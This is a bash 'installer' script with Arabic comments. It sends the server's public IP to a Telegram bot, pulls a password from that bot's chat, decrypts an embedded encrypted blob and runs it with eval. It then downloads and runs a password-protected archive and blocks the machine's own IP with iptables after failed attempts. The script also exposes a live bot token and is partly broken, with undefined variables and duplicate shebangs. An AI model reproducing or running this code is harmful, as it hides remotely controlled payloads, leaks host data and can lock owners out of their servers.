#!/usr/bin/env bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
set -euo pipefail

#!/bin/bash

# ✅ معلومات البوت
BOT_TOKEN="7261452174:AAGuIETvVBYebfQ2tlaBotPQ3RhqfsorAF0"
CHAT_ID="7432279779"

# ✅ النص المشفر (خزن في ملف مؤقت)
ENCRYPTED_FILE=$(mktemp)

cat > "$ENCRYPTED_FILE" << EOF
U2FsdGVkX18LcP0wghVQdvSYLMVLPv1XlLSgcPsllE1jPUqM+m9GKAoEB46ViWNl
sv/qrNiR07oMR9c/2oaf2BqF5yvzfk0zhCoTMd8YTAtfnnEsDTGWToEjJ8C1iRD1
s6k5MELI63yCgZXz8wxaS82ec7+ne1ipp1Tm3RVE8Qk=
EOF

# ✅ الحصول على IPv4 ديال VPS
IP=$(curl -s -4 ifconfig.me)

# ✅ إرسال طلب كلمة السر إلى تيليجرام
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d chat_id="$CHAT_ID" \
  -d text="🔐 Reply with decryption password for VPS IP: $IP" >/dev/null

# ⏳ الانتظار
echo "⏳ كينتاظر الرد من تيليجرام (30 ثانية)..."
sleep 30

# ✅ جلب آخر رسالة
response=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates")

# ✅ استخراج كلمة السر من آخر رسالة
password=$(echo "$response" | grep -oP '"text":"\K[^"]+' | tail -1)

echo "🔓 كيحاول يفك التشفير..."

# ✅ فك التشفير
DECRYPTED=$(openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:"$password" -in "$ENCRYPTED_FILE" 2>/dev/null)

# ✅ حذف الملف المؤقت
rm -f "$ENCRYPTED_FILE"

# ✅ التحقق من النتيجة
if [[ -z "$DECRYPTED" ]]; then
    echo "❌ فشل فك التشفير! كلمة السر خاطئة؟"
    exit 1
fi

# ✅ عرض النتيجة
echo "✅ تم فك التشفير بنجاح:"
echo "$DECRYPTED"

# ✅ تنفيذ النص المفكوك
eval "$DECRYPTED"
eval "$DECRYPTED"

check_install() {
    local cmd="$1"
    local pkg="$2"
    if ! command -v "$cmd" &>/dev/null; then
        echo "  '$cmd' not found. Installing..."
        apt update && apt install -y "$pkg"
    fi
}

block_ip() {
    local ip="$1"
    echo "  Blocking IP $ip permanently..."
    iptables -I INPUT -s "$ip" -j DROP
    echo "  IP $ip blocked."
}

unblock_ip() {
    local ip="$1"
    echo "  Unblocking IP $ip..."
    iptables -D INPUT -s "$ip" -j DROP || echo "[!] IP $ip not found in rules."
}

if [[ -f "$BLOCK_FLAG" ]]; then
    echo -e "${RED} VPS is permanently blocked due to too many wrong password attempts.${NC}"
    exec bash
fi

echo "  Checking required tools..."
check_install curl curl
check_install 7z p7zip-full

echo "  Downloading encrypted archive..."
curl -fsSL -o "$ARCHIVE_FILE" "$ARCHIVE_URL" || {
    echo "[-] Failed to download archive."
    exit 1
}

MAX_ATTEMPTS=5
attempt=1
success=false

while (( attempt <= MAX_ATTEMPTS )); do
    clear
    echo -e "${YELLOW} Secure Access Panel${NC}"
    echo -e "${YELLOW} Script is protected by password${NC}"
    echo -e "${YELLOW} To get the password, contact here @a_hamza_i ${NC}"
    echo -n -e " Enter password to decrypt archive (attempt $attempt/$MAX_ATTEMPTS): ${NC}"
    read -rs USER_PASS
    echo
    PASSWORD="type_pass_install.zip${USER_PASS}"
    if 7z t -p"$PASSWORD" "$ARCHIVE_FILE" &>/dev/null; then
        success=true
        break
    else
        echo -e "${RED} Wrong password. Try again.${NC}"
        ((attempt++))
    fi
done

if ! $success; then
    echo -e "${RED} Maximum password attempts reached.${NC}"

    MY_IP=$(hostname -I | awk '{print $1}')
    block_ip "$MY_IP"
    touch "$BLOCK_FLAG"

    echo -e "${RED} Your IP has been permanently blocked${NC}"

    exec bash
fi

7z x "-p$PASSWORD" -aoa "$ARCHIVE_FILE" "$EXTRACTED_FILE" >/dev/null 2>&1

if [[ ! -f "$EXTRACTED_FILE" ]]; then
    exit 1
fi

chmod +x "$EXTRACTED_FILE"
bash "$EXTRACTED_FILE"
